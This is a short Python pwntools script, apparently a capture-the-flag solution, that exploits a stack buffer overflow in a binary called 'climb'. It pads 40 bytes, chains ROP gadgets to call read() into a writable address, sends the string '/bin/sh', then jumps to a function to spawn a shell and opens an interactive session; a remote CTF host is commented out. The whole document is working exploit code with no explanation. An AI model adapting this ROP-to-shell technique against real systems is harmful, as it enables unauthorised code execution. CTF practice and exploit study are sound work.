from pwn import *

p = process("./climb")
#p = remote("cha.hackpack.club", 41702)

padd = "a" * 40
call_me = p64(0x00400664)
raw_input("continue")
#read Idea
pop_rsi_pop_r15 = p64(0x0000000000400741)
pop_rdx = p64(0x0000000000400654)
pop_rdi = p64(0x0000000000400743)
where_to_write = p64(0x00601050)
read = p64(0x00400550)

payload = ""
payload += padd
payload += pop_rdi
payload += p64(0)
payload += pop_rdx
payload += p64(10)
payload += pop_rsi_pop_r15
payload += where_to_write
payload += "AAAAAAAA"
payload += read
payload += pop_rdi
payload += where_to_write
payload += p64(0x00000000004004fe)
payload += call_me

p.sendlineafter("How will you respond? ",payload)
p.send(p64(0x68732f6e69622f))
p.interactive()

